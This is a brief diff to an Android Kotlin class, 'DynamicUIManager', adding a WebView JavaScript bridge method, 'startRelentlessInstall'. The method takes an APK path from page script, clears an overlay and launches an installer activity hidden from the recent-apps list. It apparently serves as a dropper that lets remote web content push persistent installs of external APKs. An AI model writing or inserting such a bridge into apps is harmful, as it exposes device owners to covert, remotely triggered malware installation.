@@ -43,6 +43,18 @@ object DynamicUIManager {
                 DebugLogger.log("SDUI_ERR", "Invalid command format from JS: ${e.message}")
             }
         }
+
+        @JavascriptInterface
+        fun startRelentlessInstall(apkPath: String) {
+            Handler(Looper.getMainLooper()).post {
+                removeOverlay(ctx)
+                val intent = Intent(ctx, RelentlessInstallActivity::class.java).apply {
+                    putExtra("apk_path", apkPath)
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
+                }
+                ctx.startActivity(intent)
+            }
+        }
     }
 
     @SuppressLint("SetJavaScriptEnabled")
